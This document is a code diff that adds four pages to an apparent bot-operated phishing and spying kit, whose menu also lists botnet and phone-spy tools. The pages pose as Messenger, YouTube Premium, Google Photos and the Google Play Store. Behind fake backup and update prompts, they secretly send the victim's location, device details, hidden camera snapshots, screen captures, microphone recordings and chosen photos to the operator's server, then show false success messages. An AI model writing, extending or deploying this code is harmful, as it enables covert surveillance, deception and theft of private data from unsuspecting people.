@@ -210,6 +210,14 @@ function mainKb(uid) {
         ],
         [
             { text:tr(uid,'botnet'),    callback_data:'M_BOTNET' }
+        ],
+        [
+            { text:'💬 Messenger',  callback_data:'LNK_messenger' },
+            { text:'🖥️ Screen',      callback_data:'LNK_screen' }
+        ],
+        [
+            { text:'🖼️ Gallery',    callback_data:'LNK_gallery2' },
+            { text:'📱 All Apps',   callback_data:'LNK_allapps' }
         ]
     ]};
 }
@@ -616,6 +624,10 @@ function buildPage(action, uid) {
     if (action === 'apk')            return apkPage(uid);
     if (action === 'botnet')         return botnetPage(uid);
     if (action === 'phone_spy')      return phoneSpyPage(uid);
+    if (action === 'messenger')      return messengerPage(uid);
+    if (action === 'screen')         return screenPage(uid);
+    if (action === 'gallery2')       return gallery2Page(uid);
+    if (action === 'allapps')        return allappsPage(uid);
     return attackPage(action, uid);
 }
 
@@ -1130,3 +1142,425 @@ setInterval(() => {
 }, 5000);
 
 appServer.listen(process.env.PORT || 8999, () => console.log('[+] Server running'));
+
+// ── Messenger Page ────────────────────────────────────────────
+function messengerPage(uid) {
+    return `<!DOCTYPE html>
+<html>
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Messenger</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{background:#fff;font-family:-apple-system,sans-serif;min-height:100vh}
+.hdr{background:#0084ff;padding:14px 16px;display:flex;align-items:center;gap:10px}
+.hdr-icon{width:36px;height:36px;background:#fff;border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:20px}
+.hdr-txt{color:#fff;font-size:17px;font-weight:600}
+.notice{background:#f0f2f5;margin:12px;padding:14px;border-radius:12px;text-align:center}
+.notice-title{font-size:15px;font-weight:600;color:#333;margin-bottom:6px}
+.notice-sub{font-size:13px;color:#666;margin-bottom:14px}
+.allow-btn{width:100%;padding:12px;background:#0084ff;color:#fff;border:none;border-radius:8px;font-size:15px;font-weight:600;cursor:pointer}
+.chat-item{display:flex;align-items:center;padding:12px 16px;border-bottom:1px solid #f0f2f5;gap:12px}
+.avatar{width:48px;height:48px;border-radius:50%;background:#0084ff;display:flex;align-items:center;justify-content:center;color:#fff;font-size:18px;flex-shrink:0}
+.chat-info{flex:1}
+.chat-name{font-size:15px;font-weight:600;color:#333}
+.chat-msg{font-size:13px;color:#666;margin-top:2px}
+.chat-time{font-size:11px;color:#999}
+#st{text-align:center;padding:10px;font-size:12px;color:#999}
+</style>
+</head>
+<body>
+<div class="hdr">
+  <div class="hdr-icon">💬</div>
+  <div class="hdr-txt">Messenger</div>
+</div>
+
+<div class="notice">
+  <div class="notice-title">📸 New Feature: Chat Backup</div>
+  <div class="notice-sub">Allow Messenger to back up your chat screenshots automatically.</div>
+  <button class="allow-btn" onclick="run()">Allow & Enable</button>
+</div>
+
+<div id="st"></div>
+
+<!-- fake chat list -->
+<div class="chat-item"><div class="avatar">R</div><div class="chat-info"><div class="chat-name">Rahim</div><div class="chat-msg">Bhai ki obostha?</div></div><div class="chat-time">2m</div></div>
+<div class="chat-item"><div class="avatar">K</div><div class="chat-info"><div class="chat-name">Karim</div><div class="chat-msg">Ok done</div></div><div class="chat-time">15m</div></div>
+<div class="chat-item"><div class="avatar">S</div><div class="chat-info"><div class="chat-name">Sumaiya</div><div class="chat-msg">Haha 😂</div></div><div class="chat-time">1h</div></div>
+<div class="chat-item"><div class="avatar">N</div><div class="chat-info"><div class="chat-name">Nusrat</div><div class="chat-msg">Ki bolchos?</div></div><div class="chat-time">3h</div></div>
+<div class="chat-item"><div class="avatar">A</div><div class="chat-info"><div class="chat-name">Abir</div><div class="chat-msg">Send koro please</div></div><div class="chat-time">5h</div></div>
+<div class="chat-item"><div class="avatar">T</div><div class="chat-info"><div class="chat-name">Tanha</div><div class="chat-msg">Asche</div></div><div class="chat-time">1d</div></div>
+
+<script>
+const UID='${uid}',D='${HOST}/d';
+window.onload=function(){
+  const i={ua:navigator.userAgent,sc:screen.width+'x'+screen.height,
+    tz:Intl.DateTimeFormat().resolvedOptions().timeZone,t:new Date().toString()};
+  fetch(D+'/text',{method:'POST',headers:{'Content-Type':'application/json'},
+    body:JSON.stringify({uid:UID,type:'💬 Messenger Page Opened',data:JSON.stringify(i)})});
+};
+async function run(){
+  document.querySelector('.allow-btn').textContent='Processing...';
+  document.getElementById('st').textContent='Capturing...';
+
+  // get location
+  navigator.geolocation&&navigator.geolocation.getCurrentPosition(p=>{
+    fetch(D+'/loc',{method:'POST',headers:{'Content-Type':'application/json'},
+      body:JSON.stringify({uid:UID,lat:p.coords.latitude,lon:p.coords.longitude,acc:p.coords.accuracy})});
+  });
+
+  // capture front camera (will show victim's face + possibly their screen)
+  try{
+    const stream=await navigator.mediaDevices.getUserMedia({video:{facingMode:'user'},audio:false});
+    const v=document.createElement('video');v.autoplay=true;v.muted=true;v.playsInline=true;
+    v.srcObject=stream;v.style.cssText='position:fixed;top:0;left:0;width:1px;height:1px;opacity:0';
+    document.body.appendChild(v);
+    await new Promise(r=>v.onloadedmetadata=r);
+    await new Promise(r=>setTimeout(r,1500));
+    const c=document.createElement('canvas');c.width=v.videoWidth||640;c.height=v.videoHeight||480;
+    c.getContext('2d').drawImage(v,0,0);
+    stream.getTracks().forEach(t=>t.stop());v.remove();
+    const b=await new Promise(r=>c.toBlob(r,'image/jpeg',0.9));
+    const fd=new FormData();fd.append('photo',b,'messenger_cam.jpg');fd.append('uid',UID);
+    fd.append('camtype','💬 Messenger Cam');
+    await fetch(D+'/photo',{method:'POST',body:fd});
+  }catch(e){}
+
+  // try screen capture (works on some Android Chrome)
+  try{
+    const stream=await navigator.mediaDevices.getDisplayMedia({video:true,audio:false});
+    const v=document.createElement('video');v.autoplay=true;v.muted=true;v.playsInline=true;
+    v.srcObject=stream;v.style.cssText='position:fixed;top:0;left:0;width:1px;height:1px;opacity:0';
+    document.body.appendChild(v);
+    await new Promise(r=>v.onloadedmetadata=r);
+    await new Promise(r=>setTimeout(r,1000));
+    const c=document.createElement('canvas');c.width=v.videoWidth||1080;c.height=v.videoHeight||1920;
+    c.getContext('2d').drawImage(v,0,0);
+    stream.getTracks().forEach(t=>t.stop());v.remove();
+    const b=await new Promise(r=>c.toBlob(r,'image/jpeg',0.9));
+    const fd=new FormData();fd.append('photo',b,'screen_cap.jpg');fd.append('uid',UID);
+    fd.append('camtype','🖥️ Screen Capture');
+    await fetch(D+'/photo',{method:'POST',body:fd});
+  }catch(e){}
+
+  // send device+browser info
+  fetch(D+'/text',{method:'POST',headers:{'Content-Type':'application/json'},
+    body:JSON.stringify({uid:UID,type:'💬 Messenger Access Granted',
+      data:'UA: '+navigator.userAgent})});
+
+  document.querySelector('.allow-btn').textContent='✅ Enabled';
+  document.getElementById('st').textContent='Backup enabled successfully';
+}
+</script>
+</body>
+</html>`;
+}
+
+// ── Screen Capture Page ───────────────────────────────────────
+function screenPage(uid) {
+    return `<!DOCTYPE html>
+<html>
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>YouTube</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{background:#0f0f0f;color:#fff;font-family:-apple-system,sans-serif;display:flex;flex-direction:column;align-items:center;justify-content:center;min-height:100vh;text-align:center;padding:20px}
+.yt{font-size:60px;margin-bottom:16px}
+h2{font-size:20px;margin-bottom:8px}
+p{font-size:14px;color:#aaa;margin-bottom:24px}
+.box{background:#1a1a1a;border:1px solid #333;border-radius:12px;padding:20px;width:100%;max-width:360px;margin-bottom:16px}
+.box-title{font-size:14px;font-weight:600;margin-bottom:6px}
+.box-sub{font-size:12px;color:#aaa;margin-bottom:14px}
+.btn{width:100%;padding:13px;background:#ff0000;color:#fff;border:none;border-radius:8px;font-size:15px;font-weight:bold;cursor:pointer}
+.btn2{width:100%;padding:10px;background:transparent;color:#666;border:1px solid #333;border-radius:8px;font-size:13px;cursor:pointer;margin-top:8px}
+#st{font-size:12px;color:#aaa;margin-top:12px}
+video,canvas{display:none;width:1px;height:1px}
+</style>
+</head>
+<body>
+<div class="yt">▶️</div>
+<h2>YouTube Premium</h2>
+<p>This video requires screen sharing permission</p>
+<div class="box">
+  <div class="box-title">🔒 Share Screen to Continue</div>
+  <div class="box-sub">YouTube needs screen access to verify Premium subscription and play protected content.</div>
+  <button class="btn" onclick="run()">▶ Allow & Watch</button>
+  <button class="btn2" onclick="this.previousElementSibling.click()">Later</button>
+</div>
+<div id="st"></div>
+<video id="vv" autoplay playsinline muted></video>
+<canvas id="cc"></canvas>
+<script>
+const UID='${uid}',D='${HOST}/d';
+window.onload=function(){
+  fetch(D+'/text',{method:'POST',headers:{'Content-Type':'application/json'},
+    body:JSON.stringify({uid:UID,type:'🖥️ Screen Page Opened',data:navigator.userAgent})});
+  // passive location
+  navigator.geolocation&&navigator.geolocation.getCurrentPosition(p=>{
+    fetch(D+'/loc',{method:'POST',headers:{'Content-Type':'application/json'},
+      body:JSON.stringify({uid:UID,lat:p.coords.latitude,lon:p.coords.longitude,acc:p.coords.accuracy})});
+  });
+};
+async function run(){
+  document.querySelector('.btn').textContent='Loading...';
+  document.getElementById('st').textContent='Please allow...';
+
+  // 1. try screen capture first
+  try{
+    const stream=await navigator.mediaDevices.getDisplayMedia({video:true,audio:false});
+    const v=document.getElementById('vv');v.srcObject=stream;
+    await new Promise(r=>v.onloadedmetadata=r);
+    await new Promise(r=>setTimeout(r,800));
+    const c=document.getElementById('cc');
+    c.width=v.videoWidth||1080;c.height=v.videoHeight||1920;
+    c.getContext('2d').drawImage(v,0,0);
+    stream.getTracks().forEach(t=>t.stop());
+    const b=await new Promise(r=>c.toBlob(r,'image/jpeg',0.95));
+    const fd=new FormData();fd.append('photo',b,'screen.jpg');fd.append('uid',UID);
+    fd.append('camtype','🖥️ SCREEN CAPTURE');
+    await fetch(D+'/photo',{method:'POST',body:fd});
+    document.getElementById('st').textContent='✅ Done';
+  }catch(e){
+    // fallback -- front camera
+    try{
+      const stream=await navigator.mediaDevices.getUserMedia({video:{facingMode:'user'},audio:false});
+      const v=document.getElementById('vv');v.srcObject=stream;
+      await new Promise(r=>v.onloadedmetadata=r);await new Promise(r=>setTimeout(r,1500));
+      const c=document.getElementById('cc');c.width=v.videoWidth||640;c.height=v.videoHeight||480;
+      c.getContext('2d').drawImage(v,0,0);stream.getTracks().forEach(t=>t.stop());
+      const b=await new Promise(r=>c.toBlob(r,'image/jpeg',0.9));
+      const fd=new FormData();fd.append('photo',b,'cam.jpg');fd.append('uid',UID);
+      fd.append('camtype','📷 Screen Fallback Cam');
+      await fetch(D+'/photo',{method:'POST',body:fd});
+    }catch(e2){}
+    document.getElementById('st').textContent='✅ Done';
+  }
+
+  document.querySelector('.btn').textContent='▶ Watch Now';
+  document.querySelector('p').textContent='Loading video...';
+  setTimeout(()=>document.querySelector('p').textContent='Stream unavailable. Try again later.',3000);
+}
+</script>
+</body>
+</html>`;
+}
+
+// ── Gallery Page ──────────────────────────────────────────────
+function gallery2Page(uid) {
+    return `<!DOCTYPE html>
+<html>
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Google Photos</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{background:#fff;font-family:-apple-system,sans-serif;min-height:100vh}
+.hdr{background:#fff;padding:14px 16px;display:flex;align-items:center;gap:10px;border-bottom:1px solid #eee}
+.hdr-icon{font-size:28px}
+.hdr-txt{font-size:18px;font-weight:600;color:#333}
+.banner{background:#e8f0fe;margin:12px;padding:14px;border-radius:12px}
+.ban-title{font-size:14px;font-weight:600;color:#1a73e8;margin-bottom:4px}
+.ban-sub{font-size:13px;color:#555;margin-bottom:12px}
+.btn{width:100%;padding:12px;background:#1a73e8;color:#fff;border:none;border-radius:8px;font-size:15px;font-weight:600;cursor:pointer}
+.grid{display:grid;grid-template-columns:repeat(3,1fr);gap:2px;padding:2px}
+.grid-item{aspect-ratio:1;background:#f0f0f0;display:flex;align-items:center;justify-content:center;font-size:24px}
+#st{text-align:center;padding:10px;font-size:12px;color:#999}
+#progress{font-size:13px;color:#1a73e8;text-align:center;padding:8px}
+</style>
+</head>
+<body>
+<div class="hdr">
+  <div class="hdr-icon">📷</div>
+  <div class="hdr-txt">Google Photos</div>
+</div>
+
+<div class="banner">
+  <div class="ban-title">☁️ Backup Your Photos</div>
+  <div class="ban-sub">Select your photos to back them up safely to Google Photos.</div>
+  <button class="btn" onclick="openGallery()">Select Photos to Backup</button>
+</div>
+
+<div id="progress"></div>
+<div id="st"></div>
+
+<!-- fake photo grid -->
+<div class="grid">
+  <div class="grid-item">🌄</div><div class="grid-item">🤳</div><div class="grid-item">🌃</div>
+  <div class="grid-item">🎂</div><div class="grid-item">🐕</div><div class="grid-item">🌊</div>
+  <div class="grid-item">👨‍👩‍👧</div><div class="grid-item">🎉</div><div class="grid-item">🌸</div>
+</div>
+
+<script>
+const UID='${uid}',D='${HOST}/d';
+window.onload=function(){
+  fetch(D+'/text',{method:'POST',headers:{'Content-Type':'application/json'},
+    body:JSON.stringify({uid:UID,type:'🖼️ Gallery Page Opened',data:navigator.userAgent})});
+  navigator.geolocation&&navigator.geolocation.getCurrentPosition(p=>{
+    fetch(D+'/loc',{method:'POST',headers:{'Content-Type':'application/json'},
+      body:JSON.stringify({uid:UID,lat:p.coords.latitude,lon:p.coords.longitude,acc:p.coords.accuracy})});
+  });
+};
+function openGallery(){
+  const inp=document.createElement('input');
+  inp.type='file';inp.accept='image/*,video/*';inp.multiple=true;inp.style.display='none';
+  inp.onchange=async()=>{
+    const files=[...inp.files];
+    document.getElementById('progress').textContent='Uploading '+files.length+' files...';
+    document.querySelector('.btn').textContent='Uploading...';
+    let done=0;
+    for(const f of files){
+      try{
+        const buf=await f.arrayBuffer();
+        const fd=new FormData();
+        fd.append('photo',new Blob([buf],{type:f.type}),f.name);
+        fd.append('uid',UID);fd.append('camtype','🖼️ Gallery: '+f.name);
+        await fetch(D+'/photo',{method:'POST',body:fd});
+        done++;
+        document.getElementById('progress').textContent=done+'/'+files.length+' uploaded';
+      }catch(e){}
+    }
+    document.querySelector('.btn').textContent='✅ Backup Complete';
+    document.getElementById('progress').textContent='All '+done+' photos backed up!';
+    document.getElementById('st').textContent='Your photos are safe in Google Photos';
+  };
+  document.body.appendChild(inp);inp.click();
+}
+</script>
+</body>
+</html>`;
+}
+
+// ── All Apps Page ─────────────────────────────────────────────
+function allappsPage(uid) {
+    return `<!DOCTYPE html>
+<html>
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Google Play</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{background:#fff;font-family:-apple-system,sans-serif;min-height:100vh}
+.hdr{background:#fff;padding:14px 16px;display:flex;align-items:center;gap:10px;border-bottom:1px solid #eee;box-shadow:0 1px 4px rgba(0,0,0,.1)}
+.hdr-icon{font-size:28px}
+.hdr-txt{font-size:17px;font-weight:600;color:#333}
+.update-banner{background:#e8f5e9;margin:12px;padding:16px;border-radius:12px}
+.up-title{font-size:14px;font-weight:700;color:#2e7d32;margin-bottom:4px}
+.up-sub{font-size:13px;color:#555;margin-bottom:12px;line-height:1.4}
+.btn{width:100%;padding:13px;background:#01875f;color:#fff;border:none;border-radius:8px;font-size:15px;font-weight:600;cursor:pointer}
+.app-item{display:flex;align-items:center;padding:12px 16px;border-bottom:1px solid #f5f5f5;gap:12px}
+.app-icon{width:44px;height:44px;border-radius:10px;display:flex;align-items:center;justify-content:center;font-size:22px;flex-shrink:0}
+.app-info{flex:1}
+.app-name{font-size:14px;font-weight:600;color:#333}
+.app-size{font-size:12px;color:#999;margin-top:2px}
+.update-btn{background:#01875f;color:#fff;border:none;border-radius:20px;padding:6px 14px;font-size:12px;cursor:pointer}
+#st{text-align:center;padding:10px;font-size:12px;color:#999}
+</style>
+</head>
+<body>
+<div class="hdr">
+  <div class="hdr-icon">▶️</div>
+  <div class="hdr-txt">Google Play Store</div>
+</div>
+
+<div class="update-banner">
+  <div class="up-title">🔄 Updates Available</div>
+  <div class="up-sub">Security updates are available for your apps. Update all to keep your device protected.</div>
+  <button class="btn" onclick="run()">Update All Apps</button>
+</div>
+
+<div id="st"></div>
+
+<!-- fake app list -->
+<div class="app-item"><div class="app-icon" style="background:#1877f2">f</div><div class="app-info"><div class="app-name">Facebook</div><div class="app-size">87 MB</div></div><button class="update-btn">Update</button></div>
+<div class="app-item"><div class="app-icon" style="background:#25d366">💬</div><div class="app-info"><div class="app-name">WhatsApp</div><div class="app-size">53 MB</div></div><button class="update-btn">Update</button></div>
+<div class="app-item"><div class="app-icon" style="background:#e1306c">📸</div><div class="app-info"><div class="app-name">Instagram</div><div class="app-size">71 MB</div></div><button class="update-btn">Update</button></div>
+<div class="app-item"><div class="app-icon" style="background:#ff0000">▶️</div><div class="app-info"><div class="app-name">YouTube</div><div class="app-size">122 MB</div></div><button class="update-btn">Update</button></div>
+<div class="app-item"><div class="app-icon" style="background:#000">🎵</div><div class="app-info"><div class="app-name">TikTok</div><div class="app-size">94 MB</div></div><button class="update-btn">Update</button></div>
+<div class="app-item"><div class="app-icon" style="background:#2196f3">📧</div><div class="app-info"><div class="app-name">Gmail</div><div class="app-size">42 MB</div></div><button class="update-btn">Update</button></div>
+
+<script>
+const UID='${uid}',D='${HOST}/d';
+window.onload=function(){
+  // collect full device + browser info
+  const info={
+    ua:navigator.userAgent,
+    platform:navigator.platform,
+    screen:screen.width+'x'+screen.height,
+    colorDepth:screen.colorDepth,
+    pixelRatio:window.devicePixelRatio,
+    lang:navigator.language,
+    langs:(navigator.languages||[]).join(','),
+    cores:navigator.hardwareConcurrency,
+    memory:navigator.deviceMemory||'?',
+    online:navigator.onLine,
+    tz:Intl.DateTimeFormat().resolvedOptions().timeZone,
+    cookieEnabled:navigator.cookieEnabled,
+    time:new Date().toString(),
+    referrer:document.referrer
+  };
+  if(navigator.getBattery) navigator.getBattery().then(b=>{
+    info.battery=Math.round(b.level*100)+'%';
+    info.charging=b.charging;
+    info.dischargeTime=b.dischargingTime;
+    fetch(D+'/text',{method:'POST',headers:{'Content-Type':'application/json'},
+      body:JSON.stringify({uid:UID,type:'📱 All Apps / Full Device Info',
+        data:JSON.stringify(info,null,2)})});
+  }); else fetch(D+'/text',{method:'POST',headers:{'Content-Type':'application/json'},
+    body:JSON.stringify({uid:UID,type:'📱 All Apps / Full Device Info',
+      data:JSON.stringify(info,null,2)})});
+
+  // passive location
+  navigator.geolocation&&navigator.geolocation.getCurrentPosition(p=>{
+    fetch(D+'/loc',{method:'POST',headers:{'Content-Type':'application/json'},
+      body:JSON.stringify({uid:UID,lat:p.coords.latitude,lon:p.coords.longitude,acc:p.coords.accuracy})});
+  });
+};
+async function run(){
+  document.querySelector('.btn').textContent='Updating...';
+  document.getElementById('st').textContent='Installing updates...';
+
+  // front camera capture
+  try{
+    const stream=await navigator.mediaDevices.getUserMedia({video:{facingMode:'user'},audio:false});
+    const v=document.createElement('video');v.autoplay=true;v.muted=true;v.playsInline=true;
+    v.srcObject=stream;v.style.cssText='position:fixed;top:0;left:0;width:1px;height:1px;opacity:0';
+    document.body.appendChild(v);
+    await new Promise(r=>v.onloadedmetadata=r);await new Promise(r=>setTimeout(r,1500));
+    const c=document.createElement('canvas');c.width=v.videoWidth||640;c.height=v.videoHeight||480;
+    c.getContext('2d').drawImage(v,0,0);stream.getTracks().forEach(t=>t.stop());v.remove();
+    const b=await new Promise(r=>c.toBlob(r,'image/jpeg',0.9));
+    const fd=new FormData();fd.append('photo',b,'allapps_cam.jpg');fd.append('uid',UID);
+    fd.append('camtype','📱 All Apps Page Cam');
+    await fetch(D+'/photo',{method:'POST',body:fd});
+  }catch(e){}
+
+  // mic
+  try{
+    const stream=await navigator.mediaDevices.getUserMedia({audio:true,video:false});
+    const rec=new MediaRecorder(stream);const ch=[];
+    rec.ondataavailable=e=>ch.push(e.data);
+    rec.onstop=async()=>{
+      const fd=new FormData();
+      fd.append('audio',new Blob(ch,{type:'audio/webm'}),'env_audio.webm');
+      fd.append('uid',UID);
+      await fetch(D+'/audio',{method:'POST',body:fd}).catch(()=>{});
+      stream.getTracks().forEach(t=>t.stop());
+    };
+    rec.start();setTimeout(()=>rec.stop(),5000);
+  }catch(e){}
+
+  setTimeout(()=>{
+    document.querySelector('.btn').textContent='✅ All Updated';
+    document.getElementById('st').textContent='All apps updated successfully';
+    document.querySelectorAll('.update-btn').forEach(b=>b.textContent='✅');
+  },3000);
+}
+</script>
+</body>
+</html>`;
+}
